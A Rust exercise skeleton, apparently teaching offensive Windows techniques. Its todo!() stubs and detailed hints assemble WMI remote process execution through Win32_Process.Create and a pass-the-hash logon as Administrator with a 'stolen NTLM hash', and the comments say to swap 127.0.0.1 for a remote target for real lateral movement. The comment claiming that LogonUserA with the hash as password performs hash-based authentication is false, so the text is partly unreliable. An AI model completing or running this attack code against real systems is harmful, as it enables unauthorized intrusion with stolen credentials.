use std::ffi::c_void;
use std::mem::ManuallyDrop;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Security::Authentication::Identity::{
    ImpersonateLoggedOnUser, LogonUserA, RevertToSelf, LOGON32_LOGON_NEW_CREDENTIALS,
    LOGON32_PROVIDER_DEFAULT,
};
use windows::Win32::System::Com::{
    CoCreateInstance, CoInitializeEx, CoInitializeSecurity, CoSetProxyBlanket,
    CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED, EOAC_NONE, IUnknown,
    RPC_C_AUTHN_LEVEL_CALL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
    RPC_C_IMP_LEVEL_IMPERSONATE, VARIANT, VT_BSTR,
};
use windows::Win32::System::Wmi::{
    CLSID_WbemLocator, IWbemClassObject, IWbemLocator, IWbemServices,
};
use windows::core::{BSTR, PCSTR, PWSTR};

// ── Part B helper ──────────────────────────────────────────────────────────────

// Logon with a stolen NTLM hash and impersonate the token on the current thread.
// After this call, all outbound network connections carry the stolen identity.
// The hash is passed as the password in the format: "LM_HASH:NT_HASH"
// Use LOGON32_LOGON_NEW_CREDENTIALS (type 9) — this is what enables hash-based auth.
//
// Hint:
// LogonUserA(
//     lpszUsername: PCSTR,          // account name as a null-terminated byte string
//     lpszDomain: PCSTR,            // domain or "." for local; or machine name
//     lpszPassword: PCSTR,          // NTLM hash: b"aad3b435b51404eeaad3b435b51404ee:HASH\0"
//     dwLogonType: LOGON32_LOGON_TYPE,     // LOGON32_LOGON_NEW_CREDENTIALS
//     dwLogonProvider: LOGON32_PROVIDER,   // LOGON32_PROVIDER_DEFAULT
//     phToken: *mut HANDLE,         // &mut h_token
// ) -> Result<()>
//
// Then: ImpersonateLoggedOnUser(h_token) -> Result<()>
// When done: RevertToSelf() and CloseHandle(h_token)
fn pass_the_hash(username: PCSTR, domain: PCSTR, ntlm_hash: PCSTR) -> HANDLE {
    unsafe {
        let mut h_token: HANDLE = HANDLE::default();
        todo!("LogonUserA(username, domain, ntlm_hash, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &mut h_token)");
        todo!("ImpersonateLoggedOnUser(h_token)");
        h_token
    }
}

// ── Part A: WMI lateral movement ───────────────────────────────────────────────

fn main() {
    unsafe {
        // ── COM Initialization (required before any WMI calls) ─────────────────

        // Step 1 — Initialize the COM runtime.
        // Must be the first COM call. COINIT_MULTITHREADED is correct for a console app.
        //
        // Hint: CoInitializeEx(None, COINIT_MULTITHREADED)
        // Check: HRESULT(0) = S_OK, HRESULT(1) = S_FALSE (already init). Both are fine.
        todo!("CoInitializeEx(None, COINIT_MULTITHREADED).ok()");

        // Step 2 — Set COM security model.
        // Must be called ONCE, before any COM object is created.
        // Failure or skipping this causes ExecMethod to fail with E_ACCESSDENIED on real targets.
        //
        // Hint:
        // CoInitializeSecurity(
        //     None,                        // security descriptor — None = default
        //     -1,                          // let COM pick auth services
        //     None, None,                  // no custom auth services
        //     RPC_C_AUTHN_LEVEL_DEFAULT,   // default auth level
        //     RPC_C_IMP_LEVEL_IMPERSONATE, // allow impersonation
        //     None, EOAC_NONE, None,       // no auth list, no capabilities, reserved
        // ).ok()
        todo!("CoInitializeSecurity(None, -1, None, None, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, None, EOAC_NONE, None).ok()");

        // ── WMI connection ─────────────────────────────────────────────────────

        // Step 3 — Create the WMI locator COM object.
        // IWbemLocator is the entry point. Its only job is to connect to WMI namespaces.
        //
        // Hint: let locator: IWbemLocator = CoCreateInstance(&CLSID_WbemLocator, None, CLSCTX_INPROC_SERVER)?;
        let locator: IWbemLocator = todo!("CoCreateInstance(&CLSID_WbemLocator, None, CLSCTX_INPROC_SERVER)");

        // Step 4 — Connect to the WMI namespace on the target.
        // "root\\cimv2" is the standard namespace for Win32_* classes.
        // Use 127.0.0.1 for local testing; replace with a remote hostname for real lateral movement.
        //
        // Hint:
        // let services: IWbemServices = locator.ConnectServer(
        //     &BSTR::from("\\\\127.0.0.1\\root\\cimv2"),
        //     &BSTR::from(""),   // username — empty = use current token
        //     &BSTR::from(""),   // password — empty, or NTLM hash after pass_the_hash()
        //     &BSTR::from(""),   // locale
        //     0,                 // security flags
        //     &BSTR::from(""),   // authority — "NTLMDOMAIN:WORKGROUP" for PTH
        //     None,              // context
        // )?;
        let services: IWbemServices = todo!("locator.ConnectServer(\"\\\\\\\\127.0.0.1\\\\root\\\\cimv2\", ...)");

        // Step 5 — Set the proxy authentication level on the IWbemServices proxy.
        // Without this, ExecMethod may fail with E_ACCESSDENIED on remote targets.
        //
        // Hint:
        // CoSetProxyBlanket(
        //     &services.cast::<IUnknown>()?,  // the COM proxy — cast services to IUnknown
        //     RPC_C_AUTHN_WINNT,              // NTLM authentication
        //     RPC_C_AUTHZ_NONE,               // no authorization service
        //     PWSTR::null(),                  // server principal name — null for NTLM
        //     RPC_C_AUTHN_LEVEL_CALL,         // authenticate per-call
        //     RPC_C_IMP_LEVEL_IMPERSONATE,    // allow impersonation
        //     std::ptr::null_mut(),           // auth info — null = use process token
        //     EOAC_NONE,                      // no extra capabilities
        // ).ok()
        todo!("CoSetProxyBlanket(&services.cast::<IUnknown>()?, ...)");

        // ── Method call setup ──────────────────────────────────────────────────

        // Step 6a — Get the Win32_Process class object.
        // We need the class schema to obtain the signature of the Create method.
        //
        // Hint:
        // let mut wmi_class: Option<IWbemClassObject> = None;
        // services.GetObject(&BSTR::from("Win32_Process"), 0, None, Some(&mut wmi_class), None).ok()?;
        // let wmi_class = wmi_class.unwrap();
        let mut wmi_class: Option<IWbemClassObject> = None;
        todo!("services.GetObject(&BSTR::from(\"Win32_Process\"), 0, None, Some(&mut wmi_class), None)");
        let wmi_class = wmi_class.unwrap();

        // Step 6b — Get the Create method's in-parameter schema.
        // This gives us a template IWbemClassObject describing what parameters Create accepts.
        //
        // Hint:
        // let mut in_class: Option<IWbemClassObject> = None;
        // wmi_class.GetMethod(w!("Create"), 0, &mut in_class, std::ptr::null_mut()).ok()?;
        // let in_class = in_class.unwrap();
        let mut in_class: Option<IWbemClassObject> = None;
        todo!("wmi_class.GetMethod(w!(\"Create\"), 0, &mut in_class, null_mut())");
        let in_class = in_class.unwrap();

        // Step 6c — Spawn a writable in-parameter instance from the template.
        // SpawnInstance creates a concrete instance we can fill with property values.
        //
        // Hint:
        // let mut in_params: Option<IWbemClassObject> = None;
        // in_class.SpawnInstance(0, &mut in_params).ok()?;
        // let in_params = in_params.unwrap();
        let mut in_params: Option<IWbemClassObject> = None;
        todo!("in_class.SpawnInstance(0, &mut in_params)");
        let in_params = in_params.unwrap();

        // Step 7a — Set the CommandLine property on the parameter object.
        // VARIANT holds the value. For a string, set vt = VT_BSTR and bstrVal to a BSTR.
        //
        // Hint:
        // let mut v = VARIANT::default();
        // v.Anonymous.Anonymous.vt = VT_BSTR;
        // v.Anonymous.Anonymous.Anonymous.bstrVal = ManuallyDrop::new(BSTR::from("calc.exe"));
        // in_params.Put(w!("CommandLine"), 0, &v, 0).ok()?;
        todo!("build VARIANT(VT_BSTR, \"calc.exe\") and in_params.Put(w!(\"CommandLine\"), 0, &v, 0)");

        // Step 7b — Execute Win32_Process.Create via WMI.
        // This is the actual remote execution call.
        //
        // Hint:
        // let mut out_params: Option<IWbemClassObject> = None;
        // services.ExecMethod(
        //     &BSTR::from("Win32_Process"),  // class path (not an instance)
        //     &BSTR::from("Create"),         // method name
        //     0,                             // flags
        //     None,                          // context
        //     Some(&in_params),              // in-parameters we built above
        //     Some(&mut out_params),         // receives ReturnValue + ProcessId
        //     None,                          // call result object
        // ).ok()?;
        let mut out_params: Option<IWbemClassObject> = None;
        todo!("services.ExecMethod(&BSTR::from(\"Win32_Process\"), &BSTR::from(\"Create\"), 0, None, Some(&in_params), Some(&mut out_params), None)");

        // Step 7c — Read the return value and process ID from out_params.
        // ReturnValue == 0 means success. ProcessId is the PID of the new process.
        //
        // Hint: use out_params.unwrap().Get(w!("ReturnValue"), 0, &mut val, ...) to read each field.
        // VARIANT.Anonymous.Anonymous.Anonymous.intVal (for integers)
        todo!("read ReturnValue and ProcessId from out_params and print them");

        println!("[+] WMI ExecMethod call complete");
        // If successful, calc.exe should now be running (check Task Manager).

        // ── Part B: Pass-the-hash (uncomment and fill when you have a valid hash) ──
        //
        // let _h_token = pass_the_hash(
        //     PCSTR(b"Administrator\0".as_ptr()),
        //     PCSTR(b".\0".as_ptr()),                    // "." = local machine
        //     PCSTR(b"aad3b435b51404eeaad3b435b51404ee:YOUR_NT_HASH_HERE\0".as_ptr()),
        // );
        // // Re-run the WMI connection above (steps 3–7) after impersonation
        // // to authenticate to a real remote target as the Administrator.
        // //
        // // When done:
        // // RevertToSelf().ok();
        // // CloseHandle(_h_token).ok();
    }
}
